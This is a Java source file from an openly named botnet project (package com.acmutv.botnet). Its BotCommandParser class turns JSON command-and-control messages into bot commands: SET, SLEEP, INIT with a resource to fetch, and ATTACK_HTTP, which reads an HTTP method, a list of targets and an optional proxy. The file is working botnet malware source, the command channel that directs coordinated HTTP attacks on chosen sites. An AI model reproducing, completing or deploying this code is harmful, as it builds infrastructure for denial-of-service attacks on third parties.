/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.bot.command;

import com.acmutv.botnet.attack.HttpAttackMethod;
import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.target.HttpTarget;
import com.acmutv.botnet.target.HttpTargetProxy;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes command prsing utilities.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
public class BotCommandParser {

  private static final Logger LOGGER = LogManager.getLogger(BotCommandParser.class);

  private static final CommandScope DEFAULT_COMMAND = CommandScope.NONE;
  private static final Map<String,String> DEFAULT_SET_SETTINGS = new HashMap<>();
  private static final int DEFAULT_SLEEP_AMOUNT = 0;
  private static final TimeUnit DEFAULT_SLEEP_UNIT = TimeUnit.SECONDS;
  private static final List<HttpTarget> DEFAULT_ATTACK_HTTP_TARGETS = new ArrayList<>();
  private static final HttpTargetProxy DEFAULT_ATTACK_HTTP_PROXY = null;
  private static final HttpAttackMethod DEFAULT_ATTACK_HTTP_METHOD = HttpAttackMethod.GET;

  /**
   * Parses a BotCommand from a JSON.
   * @param json the JSON to parse.
   * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
   */
  public static BotCommand fromJson(String json) {
    InputStream stream = new ByteArrayInputStream(json.getBytes(StandardCharsets.UTF_8));
    BotCommand cmd = BotCommandParser.fromJson(stream);
    try {
      stream.close();
    } catch (IOException e) {
      e.printStackTrace();
    }
    return cmd;
  }

  /**
   * Parses a BotCommand from a JSON.
   * @param json the JSON to parse.
   * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
   */
  public static BotCommand fromJson(File json) {
    InputStream stream;
    try {
      stream = new FileInputStream(json);
    } catch (FileNotFoundException e) {
      e.printStackTrace();
      return new BotCommand();
    }
    BotCommand cmd = BotCommandParser.fromJson(stream);
    try {
      stream.close();
    } catch (IOException e) {
      e.printStackTrace();
    }
    return cmd;
  }

  /**
   * Parses a BotCommand from a JSON.
   * @param json the JSON to parse.
   * @return the parsed BotCommand; BotCommand with scope NONE, in case of errors.
   */
  public static BotCommand fromJson(InputStream json) {
    BotCommand cmd = new BotCommand();
    ObjectMapper mapper = new ObjectMapper();

    JsonNode node;
    try {
      node = mapper.readValue(json, JsonNode.class);
    } catch (IOException e) {
      return cmd;
    }

    final CommandScope scope = (node.has("command")) ?
        CommandScope.from(node.get("command").asText(BotCommandParser.DEFAULT_COMMAND.name()))
        :
        BotCommandParser.DEFAULT_COMMAND;
    cmd.setScope(scope);

    if (cmd.getScope().isWithParams()) {
      switch (cmd.getScope()) {

        case SET:
          final Map<String,String> settings = (node.has("settings")) ?
              BotCommandParser.parseMapStringString(mapper, node.get("settings"))
              :
              BotCommandParser.DEFAULT_SET_SETTINGS;
          cmd.getParams().put("settings", settings);
          break;

        case SLEEP:
          final int sleepAmount = (node.has("amount")) ?
              node.get("amount").asInt(BotCommandParser.DEFAULT_SLEEP_AMOUNT)
              :
              BotCommandParser.DEFAULT_SLEEP_AMOUNT;
          final TimeUnit sleepUnit = (node.has("unit")) ?
              TimeUnit.valueOf(node.get("unit").asText(BotCommandParser.DEFAULT_SLEEP_UNIT.name()))
              :
              BotCommandParser.DEFAULT_SLEEP_UNIT;
          cmd.getParams().put("amount", sleepAmount);
          cmd.getParams().put("unit", sleepUnit);
          break;

        case INIT:
          final String DEFAULT_INIT_RESOURCE = AppConfigurationService.getConfigurations().getInitResource();
          final String initResource = (node.has("resource")) ?
              node.get("resource").asText(DEFAULT_INIT_RESOURCE)
              :
              DEFAULT_INIT_RESOURCE;
          cmd.getParams().put("resource", initResource);
          break;

        case ATTACK_HTTP:
          final HttpAttackMethod httpMethod = (node.has("method")) ?
              HttpAttackMethod.from(node.get("method").asText(BotCommandParser.DEFAULT_ATTACK_HTTP_METHOD.name()))
              :
              BotCommandParser.DEFAULT_ATTACK_HTTP_METHOD;
          final List<HttpTarget> httpTargets = (node.has("targets")) ?
              BotCommandParser.parseList(mapper, node.get("targets"), HttpTarget.class)
              :
              BotCommandParser.DEFAULT_ATTACK_HTTP_TARGETS;
          final HttpTargetProxy httpProxy = (node.has("proxy")) ?
              BotCommandParser.parseObject(mapper, node.get("proxy"), HttpTargetProxy.class)
              :
              BotCommandParser.DEFAULT_ATTACK_HTTP_PROXY;
          cmd.getParams().put("method", httpMethod);
          cmd.getParams().put("targets", httpTargets);
          cmd.getParams().put("proxy", httpProxy);
          break;

        default:
          break;
      }
    }

    return cmd;
  }

  /**
   * Parses an object from a JSON node.
   * @param mapper the JSON mapper.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed object; null, in case of error.
   */
  private static <T> T parseObject(ObjectMapper mapper, JsonNode node, Class<T> type) {
    T obj;
    try {
      obj = mapper.treeToValue(node, type);
    } catch (JsonProcessingException e) {
      e.printStackTrace();
      obj = null;
    }
    return obj;
  }

  /**
   * Parses a list of objects from a JSON node.
   * @param mapper the JSON mapper.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed list of objects; an empty list, in case of error.
   */
  private static <T> List<T> parseList(ObjectMapper mapper, JsonNode node, Class<T> type) {
    List<T> list = new ArrayList<>();
    node.forEach(n -> {
      try {
        T obj = mapper.treeToValue(n, type);
        list.add(obj);
      } catch (JsonProcessingException e) {
        e.printStackTrace();
      }
    });
    return list;
  }
  /**
   * Parses a map from a JSON node.
   * @param mapper the JSON mapper.
   * @param node the JSON node to parse.
   * @return the parsed map; an empty map, in case of error.
   */
  private static Map<String, String> parseMapStringString(ObjectMapper mapper, JsonNode node) {
    Map<String,String> map = new HashMap<>();
    node.elements().forEachRemaining(n -> {
      if (!n.has("property") || !n.has("value")) return;
      final String k = n.get("property").asText();
      final String v = n.get("value").asText();
      map.put(k, v);
    });
    return map;
  }

}
